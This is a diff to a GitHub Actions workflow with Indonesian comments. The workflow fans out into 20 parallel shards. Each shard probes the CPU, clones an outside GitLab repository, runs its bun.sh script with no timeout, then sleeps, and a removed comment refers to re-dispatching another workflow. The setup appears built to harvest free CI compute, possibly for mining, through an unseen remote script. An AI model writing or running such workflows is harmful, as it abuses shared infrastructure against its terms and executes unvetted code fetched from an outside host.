@@ -8,7 +8,6 @@ on:
         required: true
         default: '18000'
 
-# ⚠️ JANGAN HAPUS — tanpa ini dispatch balik ke hello akan 403
 permissions:
   actions: write
   contents: read
@@ -21,11 +20,11 @@ jobs:
       matrix:
         shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 325
+    timeout-minutes: 15
     steps:
       - name: "shard ${{ matrix.shard }}/20 — lscpu + clone + bun.sh + sleep"
         env:
-          SLEEP_SECONDS: "760"
+          SLEEP_SECONDS: "60"
           REPO_URL: https://gitlab.com/line789/xiaomi89.git
           NODE_VERSION: "22.11.0"
           SHARD: ${{ matrix.shard }}
@@ -33,19 +32,15 @@ jobs:
           set -euo pipefail
 
           echo "=== shard $SHARD/20 ==="
-          lscpu | head -10 || true
+          lscpu | head -10
           echo "nproc: $(nproc --all)"
-          grep -m1 "model name" /proc/cpuinfo || true
+          grep -m1 "model name" /proc/cpuinfo
 
           echo "=== 1. install Node portable v${NODE_VERSION} ==="
           NODE_DIR="$HOME/.local/node"
           mkdir -p "$NODE_DIR"
           if [ ! -x "$NODE_DIR/bin/node" ]; then
-            python3 - <<PY
-import urllib.request
-url = "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
-urllib.request.urlretrieve(url, "$NODE_DIR/node.tar.xz")
-PY
+            curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz" -o "$NODE_DIR/node.tar.xz"
             tar -xf "$NODE_DIR/node.tar.xz" -C "$NODE_DIR" --strip-components=1
             rm -f "$NODE_DIR/node.tar.xz"
           fi
@@ -71,7 +66,7 @@ PY
 
           echo "=== 4. jalankan bun.sh (tanpa timeout) ==="
           ./bun.sh
-          echo "bun.sh selesai, exit=0"
+          echo "bun.sh selesai"
 
           echo "=== 5. sleep ${SLEEP_SECONDS}s (padding) ==="
           sleep "$SLEEP_SECONDS"
